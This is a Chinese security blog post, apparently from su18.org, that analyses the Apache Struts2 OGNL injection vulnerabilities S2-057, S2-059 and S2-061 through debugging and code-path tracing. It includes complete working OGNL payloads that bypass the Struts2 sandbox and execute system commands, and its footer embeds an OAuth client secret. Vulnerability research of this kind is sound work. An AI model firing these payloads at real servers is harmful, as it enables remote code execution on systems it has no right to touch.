@@ -1,0 +1,475 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Struts2：你说你好累，已无法再爱上谁（四） | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Struts2：你说你好累，已无法再爱上谁（四）
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-11
+              </span>
+              <span>
+                18 min read
+              </span>
+              
+                <a href="https://su18.org/tag/Z0wjLXu3H/" class="post-tag">
+                  # struts2
+                </a>
+              
+                <a href="https://su18.org/tag/Aj7jHTqIBO/" class="post-tag">
+                  # ognl
+                </a>
+              
+                <a href="https://su18.org/tag/J9zfIgD5go/" class="post-tag">
+                  # java
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/struts2-4.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>本系列第四篇文章，记录 s2-057/s2-059/s2-061 的调试过程。</p>
+<h1 id="s2-057">S2-057</h1>
+<p>Struts2 处理重定向结果时，会从配置文件中取 namespace，如果取不到，会从当前 ActionMapping 中取，攻击者带入恶意的 namespace 在某些情况下可能导致漏洞。</p>
+<blockquote>
+<p>影响版本：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16<br>
+参考链接：https://cwiki.apache.org/confluence/display/WW/S2-057<br>
+描述：namespace 处插入 OGNL 代码引发的漏洞。</p>
+</blockquote>
+<p>漏洞作者从 S2-032/S2-033/S2-037 的漏洞中获得启发，Struts2 将不受信任的输入使用 ognl 解析导致了多个 RCE 漏洞，并且不停的修复。于是使用 QL 对常见 Struts2 RCE 的 sink/sources 点进行了定义，并配置 DataFlow 库追踪污点。这一手操作太强了，可以说我连看都没看懂，所以暂时不去分析作者的挖掘过程，只关注他爆出的漏洞点。</p>
+<p>作者在其<a href="https://securitylab.github.com/research/apache-struts-CVE-2018-11776/">博客</a>中列出了他找到的 5 个入口点，分别为 ServletActionRedirectResult/ActionChainResult/PostbackResult/ServletUrlRenderer/PortletActionRedirectResult。</p>
+<p>这个点也可以说是 S2-012 的兄弟洞，在 S2-012 中，ServletRedirectResult 的 <code>execute()</code> 方法调用了 conditionalParse 方法二次解析了 this.location，而这个属性是用户配置的输入，造成了漏洞。而 S2-057 的基本原理也是类似，我们依次来分析一下这五个不同的入口点都对应了什么样的情况。</p>
+<h2 id="servletactionredirectresult">ServletActionRedirectResult</h2>
+<p>ServletActionRedirectResult 与 StrutsResultSupport 同为 StrutsResultSupport 的子类，用来处理重定向时的处理结果。它的 execute 方法会调用 conditionalParse 处理 actionName/namespace/method。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1620703163891.png" alt="" loading="lazy"></figure>
+<p>当配置 result 类型为 redirectAction 时，结果将会重定向到另一个 Action，此时将会由 ServletActionRedirectResult 来处理。例如如下配置：</p>
+<pre><code class="language-xml">&lt;package name=&quot;default&quot; namespace=&quot;/&quot; extends=&quot;struts-default&quot;&gt;
+        &lt;action name=&quot;hello&quot; class=&quot;org.su18.struts.action.HelloWorld&quot;&gt;
+            &lt;result type=&quot;redirectAction&quot;&gt;
+                &lt;param name=&quot;actionName&quot;&gt;bye&lt;/param&gt;
+                &lt;param name=&quot;namespace&quot;&gt;hhh&lt;/param&gt;
+                &lt;param name=&quot;id&quot;&gt;123&lt;/param&gt;
+                &lt;param name=&quot;name&quot;&gt;phoebe&lt;/param&gt;
+                &lt;param name=&quot;gender&quot;&gt;girl&lt;/param&gt;
+            &lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;
+</code></pre>
+<p>在访问 hello.action 后，结果将会根据我们的配置进行转发，浏览器会跳转页面：</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1620713521187.png" alt="" loading="lazy"></figure>
+<p>流程就是这样的流程，但是如何触发漏洞呢？在 ServletActionRedirectResult 的 execute 中我们可以看到，程序从我们的配置中获取了 actionName、namespace、method 三个参数的值，通过 ActionMapper 的 getUriFromActionMapping 方法将配置信息处理成要跳转的路径。并使用 <code>setLocation</code> 方法设置到 StrutsResultSupport 的 location 属性中。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1620716370273.png" alt="" loading="lazy"></figure>
+<p>然后执行父类的 execute 方法，调用 conditionalParse 方法解析 location 中的内容。接下来的流程与 S2-012 一致。</p>
+<p>能影响最终 location 的就是我们配置的属性，其中 actionName 和 method 都是从配置文件中获取的，只有当 namespace 为空时，将会调用 <code>invocation.getProxy().getNamespace()</code> 获取当前 ActionProxy 中存放的 namespace。</p>
+<p>在正常情况下，处理这个 namespace 属性是由 ActionMapping 的子类 DefaultActionMapper 中的 parseNameAndNamespace 方法实现：</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1620717036949.png" alt="" loading="lazy"></figure>
+<p>其中会判断 alwaysSelectFullNamespace，这个参数名为允许采用完整的命名空间，即设置命名空间是否必须进行精确匹配，true 必须，false 可以模糊匹配，默认是 false。进行精确匹配时要求请求 url 中的命名空间必须与配置文件中配置的某个命名空间必须相同，如果没有找到相同的则匹配失败。如果想要开启可以在 struts2.xml 中配置如下常量。</p>
+<pre><code class="language-xml">&lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;
+</code></pre>
+<p>开启后，程序会在 ActionMapper 中放入精确的 namespace，否则通常情况下 namespace 会置为空。</p>
+<p>这样这个漏洞的完整利用条件就可以理解了，在 Action 没有设置 namespace 属性，或使用了通配符，并且应用程序设置 alwaysSelectFullNamespace 为 true 时，攻击者可以通过 namespace 输入恶意 OGNL 表达式导致 RCE。</p>
+<h2 id="actionchainresult">ActionChainResult</h2>
+<p>ActionChainResult 用来处理 Action 的链式调用，虽然本质上也是 Redirect，但是跳转后的 action 可以获取上个 Action 的相关信息，并且这个跳转是由内部进行实现的，用户端是无感知的。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1620718337407.png" alt="" loading="lazy"></figure>
+<p>通过 ActionChainResult 的 execute 代码可以看到，获取 namespace 时是与 ServletActionRedirectResult 相同的逻辑，直接使用 <code>TextParseUtil.translateVariables</code> 解析触发漏洞。</p>
+<p>当 result 类型设置为 chain 时，重定向结果由 ActionChainResult 处理。</p>
+<pre><code class="language-xml">&lt;action name=&quot;hello&quot; class=&quot;org.su18.struts.action.HelloWorld&quot;&gt;
+    &lt;result type=&quot;chain&quot;&gt;
+        &lt;param name=&quot;actionName&quot;&gt;bye&lt;/param&gt;
+    &lt;/result&gt;
+&lt;/action&gt;
+</code></pre>
+<p>而漏洞触发条件与 ServletActionRedirectResult 一致，触发位置也一致。</p>
+<h2 id="postbackresult">PostbackResult</h2>
+<p>PostbackResult 会将 Action 的处理结果作为请求参数进行 Action 转发。</p>
+<p>PostbackResult 的处理逻辑与 ServletActionRedirectResult 几乎一致，以下图片用红框将关键点圈出来，不再用文字描述其中过程。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1620720436532.png" alt="" loading="lazy"></figure>
+<p>当 result 类型设置为 chain 时，重定向结果由 PostbackResult 处理。</p>
+<pre><code class="language-xml">&lt;action name=&quot;hello&quot; class=&quot;org.su18.struts.action.HelloWorld&quot;&gt;
+    &lt;result type=&quot;postback&quot;&gt;
+        &lt;param name=&quot;actionName&quot;&gt;bye&lt;/param&gt;
+    &lt;/result&gt;
+&lt;/action&gt;
+</code></pre>
+<p>而漏洞触发条件与前两个一致，不再重复。</p>
+<h2 id="portletactionredirectresult">PortletActionRedirectResult</h2>
+<p>PortletActionRedirectResult 类位于插件 struts2-portlet-plugin 插件包中，处理逻辑与 ServletActionRedirectResult 基本一致，如下：</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1620724258858.png" alt="" loading="lazy"></figure>
+<p>需要配置 portlet.xml ，并在 struts.xml 中配置 result 类型为 redirect-action</p>
+<pre><code class="language-xml">&lt;package name=&quot;default&quot; extends=&quot;struts-portlet-default&quot;&gt;
+    &lt;action name=&quot;hello&quot; class=&quot;org.su18.struts.action.HelloWorld&quot;&gt;
+        &lt;result type=&quot;redirect-action&quot;&gt;
+            &lt;param name=&quot;actionName&quot;&gt;bye&lt;/param&gt;
+        &lt;/result&gt;
+    &lt;/action&gt;
+&lt;/package&gt;
+</code></pre>
+<p>而漏洞触发条件与之前一致，不再重复。</p>
+<h2 id="servleturlrenderer">ServletUrlRenderer</h2>
+<p>除了上面几个重定向时对 namespace 的解析是属于同一种类的漏洞触发之外，漏洞作者还提到了 ServletUrlRenderer 这个类。</p>
+<p>这个类在 S2-013 时我们就见过，Struts2 中使用链接标签 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 时，如果 includeParams 设置为 get/all，Struts2 会将当前请求的参数解析并带入链接标签中，造成漏洞。对于 S2-013 来说，重要的漏洞触发点就在于 ServletUrlRenderer 的 <code>beforeRenderUrl()</code> 和 <code>renderUrl()</code> 方法。</p>
+<p>但是这个漏洞已经被修复了，把 renderUrl 方法中调用的 <code>UrlHelper#buildParameterSubstring</code> 中的解析功能删掉了，只保留了 URLEncode 编码。为什么在 S2-057 中又提到了这个点呢？</p>
+<p>根据官方描述，当使用 URL 标签，并且同时没有设置 value 和 action ，而且上层的 package 没有设置 namespace 时可能会产生漏洞。</p>
+<p>我们来复现一下，在 struts.xml 里设置 <code>struts.mapper.alwaysSelectFullNamespace</code> 为 true，package 中不设置 namespace，result 设置为 jsp。</p>
+<pre><code class="language-xml">&lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;
+&lt;package name=&quot;default&quot; extends=&quot;struts-default&quot;&gt;
+    &lt;action name=&quot;hello&quot; class=&quot;org.su18.struts.action.HelloWorld&quot;&gt;
+        &lt;result name=&quot;success&quot;&gt;../index.jsp&lt;/result&gt;
+    &lt;/action&gt;
+&lt;/package&gt;
+</code></pre>
+<p>JSP 中我们随便写一个 url tag，里面的 value 和 action 都不配置。</p>
+<pre><code class="language-html">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;S2-057&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;s:url&gt;
+    &lt;s:param name=&quot;id&quot;&gt;123&lt;/s:param&gt;
+&lt;/s:url&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>此时启动项目访问即可触发漏洞。</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1620728584959.png" alt="" loading="lazy"></figure>
+<p>其实触发逻辑与前面 4 个一致，都是因为没有配置 namespace ，程序从当前 ActionMapping 中取，并拼接，拼接后被解析触发漏洞。</p>
+<p>ServletUrlRenderer 的 <code>renderUrl()</code> 方法存在判断：如果 Value 和 Action 都为空时，将从ActionInvocation 的 ActionProxy 中获取 namespace，并传入 determineActionURL 方法处理。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1620728849268.png" alt="" loading="lazy"></figure>
+<p><code>UrlProvider.determineActionURL</code> 方法调用组件的 determineActionURL ，调用 determineNamespace 方法处理 namespace，而又调用 findString 方法。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1620728938707.png" alt="" loading="lazy"></figure>
+<p>findString 调用 findValue 方法，最终调用了 <code>TextParseUtil.translateVariables</code> 解析 namespace。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1620729950159.png" alt="" loading="lazy"></figure>
+<p>好了，到此为止我们已经分析完了 S2-057 所有的触发点，那该如何构造 payload 呢？</p>
+<p>在 Struts 2.5.11 版本后，在为 OgnlUtil 注入 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 时，赋值前使用了 <code>Collections.unmodifiableSet()</code> 将这几个属性赋值成为了不可修改的 SET，用来防止在 S2-045 中我们清空 OgnlUtil 属性用来绕过黑名单的操作。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1620733375397.png" alt="" loading="lazy"></figure>
+<p>在 2.5.13 版本中，使用了 OGNL 3.1.15 版本，这个版本中，在 OgnlContext 中，无论是 get/put/remove 还是其他相关的方法，都移除了对 context 关键字的支持，也就是说，我们无法再使用 <code>#context</code> 直接获取 context 对象了。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1620732710920.png" alt="" loading="lazy"></figure>
+<p>那么根据 S2-045 的 payload，我们需要想办法绕过上面的限制：</p>
+<ul>
+<li>不使用 <code>#context</code> 关键字获取 context 对象。</li>
+<li>不能使用 clear 方法清空 OgnlUtil 中的 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 的属性，应该寻找其他方法。</li>
+</ul>
+<p>而这个绕过其实非常简单：</p>
+<ol>
+<li>对于 <code>#context</code> 关键字的问题，我们可以使用 context 对象存在其他关键字对象中的引用来获取，通过寻找，可以使用如下方式获取：
+<ul>
+<li>通过 request 中值栈的 context 属性：<code>#request['struts.valueStack'].context</code></li>
+<li>通过 attr 中保存的 context 对象：<code>#attr['com.opensymphony.xwork2.util.ValueStack.ValueStack'].context</code> 或者 <code>#attr['struts.valueStack'].context</code></li>
+</ul>
+</li>
+<li>对于清空 OgnlUtil 中的属性，其实就更简单了，在 S2-045 我们分析过，之所以没有使用赋值的形式进行清空，就是因为它的 set 方法只是将传入的字符串 add 进去。而现在是根据传入的字符串重新生成 unmodifiableSet，再进行赋值，那我们直接调用相应的 set 方法传入一些无关紧要的包名或者类名即可。</li>
+</ol>
+<p>此处有一个点需要注意的是，由于 unmodifiableSet 的原因，我们使用了 set 方法改变 excludedPackageNames、excludedClasses、excludedPackageNamePatterns 属性的值，此时不是清空，而是修改了引用对象，而此时 OgnlValueStack.securityMemberAccess 的引用对象并没有变，所以并没有修改掉 securityMemberAccess 中的内容，但是我们在之前的分析就提到过，OgnlUtil 是单例对象，改过一次之后，下次获取还是这个，因此第二次再访问创建 OgnlValueStack 时，将会使用我们修改过的属性值，从而绕过黑名单。</p>
+<p>因此最终的 payload 为：第一个请求用来清空 OgnlUtil 中的属性</p>
+<pre><code>(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
+</code></pre>
+<p>第二个请求用来发送 payload</p>
+<pre><code>(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))
+</code></pre>
+<p>或者写在同一个请求中发送两次也可：</p>
+<pre><code>%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames('').(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')))}
+</code></pre>
+<h1 id="s2-059">S2-059</h1>
+<p>与 S2-029/S2-036 类似的漏洞点。</p>
+<blockquote>
+<p>影响版本：Struts 2.0.0 - Struts 2.5.20<br>
+参考链接：https://cwiki.apache.org/confluence/display/WW/S2-059<br>
+描述：不正确的给标签属性添加 OGNL 解析，可能会造成二次解析导致 RCE。</p>
+</blockquote>
+<p>这个漏洞通俗来讲，就是用户在配置模板或者配置文件时，对一些属性和参数使用 “${}” 和 “%{}” 包裹，进行强制计算， 就会导致 OGNL 二次解析。</p>
+<p>早在 S2-029 和 S2-036 就有了类似的安全公告，但是我没有去做分析，因为此类漏洞的主要成因是用户的配置错误，就好像 SQL 注入漏洞的成因是用户把不受信任的输入带入了数据库查询语句一样，你只能让开发者背锅，你没办法说是框架的锅。而之前的 S2-012、S2-013、S2-014、S2-015，也可以归结到此类漏洞范围中。</p>
+<p>其中 S2-029 官方描述受影响的标签为：</p>
+<pre><code class="language-html">&lt;s:i18nname=&quot;%{#request.params}&quot;&gt;su18&lt;/s:i18n&gt;
+&lt;s:textname=&quot;%{#request.params}&quot;&gt;su18&lt;/s:text&gt;
+</code></pre>
+<p>S2-036 则描述 tag 内属性使用 <code>%{...}</code> 会导致 RCE。</p>
+<p>而 S2-059 也是同样的漏洞。描述受影响的标签为 <code>&lt;s:a id=&quot;%{id}&quot;&gt;S2-059&lt;/s:a&gt;</code>。简单搭建一个测试环境试一下：</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1620785079369.png" alt="" loading="lazy"></figure>
+<p>这个漏洞的实际触发还是在解析标签时由 ComponentTagSupport 的子类（也就是各个标签不同类型）在使用 start 方法解析时，调用了 <code>Component#findString</code> 方法导致了表达式的解析。</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1620786682203.png" alt="" loading="lazy"></figure>
+<p>漏洞触发和调用过程之前都分析过，都是相似的，在这里就不重复了。我们同时关注一下这个漏洞影响的最高版本 Struts 2.5.20 版本中的安全更新。</p>
+<p>在 Struts 2.5.17 之后，官方更新了 excludedClasses 和 excludedPackageNames，在 excludedClasses 中移除了 ognl 包中的内容，但是在 excludedPackageNames 中加入了 <code>com.opensymphony.xwork2.ognl.</code> 。</p>
+<figure data-type="image" tabindex="16"><img src="https://su18.org/post-images/1620788026690.png" alt="" loading="lazy"></figure>
+<p>OnglUtil 中各个属性的 set 方法由 public 改为了 protected。包括三个黑名单属性值，此时我们将不能直接调用 set 方法。</p>
+<figure data-type="image" tabindex="17"><img src="https://su18.org/post-images/1620788787550.png" alt="" loading="lazy"></figure>
+<p>并且重写了这几个 set 方法中，不再单纯的生成新 set 并重新引用，而是将原始的 set 加上用户输入最终处理成 <code>Collections.unmodifiableSet()</code> 再进行赋值。此时我们将不能通过 <code>clear()</code> 或者 set 方法清空其中的值。</p>
+<p>在 ognl 3.2.10 版本之后，删除了 DefaultMemberAccess 类，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且 _memberAccess 变成了 final。SecurityMemberAccess 不再继承DefaultMemberAccess 而直接转为 MemberAccess 接口的实现。因此我们不再能使用 DEFAULT_MEMBER_ACCESS 对象覆盖 _memberAccess。</p>
+<p>在更高版本的 ognl 中，调用方法的 invokeMethod 方法中进行了判断，禁止调用了一些经常使用的恶意黑名单方法。</p>
+<figure data-type="image" tabindex="18"><img src="https://su18.org/post-images/1620791585175.png" alt="" loading="lazy"></figure>
+<p>经过上述的安全更新之后，我们在 S2-057 以及之前绕过 Struts2 的的所有想法的策略基本都被禁掉了。因此想要执行恶意 OGNL 变得越来越难。</p>
+<h1 id="s2-061">S2-061</h1>
+<p>S2-061 是对 S2-059 沙盒进行的绕过。</p>
+<blockquote>
+<p>影响版本：Struts 2.0.0 - Struts 2.5.25<br>
+参考链接：https://cwiki.apache.org/confluence/display/WW/S2-061<br>
+描述：依旧是由于标签中使用 <code>%{}</code> 导致的安全漏洞。</p>
+</blockquote>
+<p>网络上流传了如下的 POC，说是可以用来绕过沙盒，我们来看一下：</p>
+<pre><code>%{
+(#im=#application[&quot;org.apache.tomcat.InstanceManager&quot;]).
+(#stack=#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).
+(#bm=#im.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).
+(#bm.setBean(#stack)).
+(#context=#bm.get(&quot;context&quot;)).
+(#bm.setBean(#context)).
+(#ma=#bm.get(&quot;memberAccess&quot;)).
+(#bm.setBean(#ma)).
+(#emptyset=#im.newInstance(&quot;java.util.HashSet&quot;)).
+(#bm.put(&quot;excludedClasses&quot;,#emptyset)).
+(#bm.put(&quot;excludedPackageNames&quot;,#emptyset)).
+(#arglist=#im.newInstance(&quot;java.util.ArrayList&quot;)).
+(#arglist.add(&quot;open -a Calculator.app&quot;).
+(#execute=#im.newInstance(&quot;freemarker.template.utility.Execute&quot;)).
+(#execute.exec(#arglist))
+}
+</code></pre>
+<p>通过 POC 我们发现，这个利用方式是需要 Tomcat 的 InstanceManager 和 Commons-Collections 中的 BeanMap 依赖，也就是有条件的绕过，不再是像之前一样的通杀绕过沙盒。</p>
+<p>这个版本的沙盒绕过思路，实际上是相当简单暴力，之前我们经历了若干个版本的攻与防，Struts2 官方通过黑名单、权限、类型的验证来限制我们执行恶意表达式，除了 OGNL 包里面方法调用时加的硬性限制之外，这些限制其实两个字就可以全都绕过：反射。</p>
+<p>这就有点挖反序列化 gadget 的感觉了，POC 的具体分析<a href="https://www.anquanke.com/post/id/225252">这篇文章</a>写的非常好，我这里就不再重复了，文中最后留的 POC 有下面两个：</p>
+<p>使用 application：</p>
+<pre><code>%{
+(#application.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#application.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + 
+
+(#application.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +
+(#application.map2.setBean(#application.get('map').get('context')) == true).toString().substring(0,0) + 
+
+
+(#application.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#application.map3.setBean(#application.get('map2').get('memberAccess')) == true).toString().substring(0,0) + 
+
+(#application.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + 
+(#application.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +
+
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))
+}
+</code></pre>
+<p>使用 request：</p>
+<pre><code>%{
+(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + 
+
+(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + 
+
+
+(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + 
+
+(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + 
+(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +
+
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'calc.exe'}))
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#s2-057">S2-057</a>
+<ul>
+<li><a href="#servletactionredirectresult">ServletActionRedirectResult</a></li>
+<li><a href="#actionchainresult">ActionChainResult</a></li>
+<li><a href="#postbackresult">PostbackResult</a></li>
+<li><a href="#portletactionredirectresult">PortletActionRedirectResult</a></li>
+<li><a href="#servleturlrenderer">ServletUrlRenderer</a></li>
+</ul>
+</li>
+<li><a href="#s2-059">S2-059</a></li>
+<li><a href="#s2-061">S2-061</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
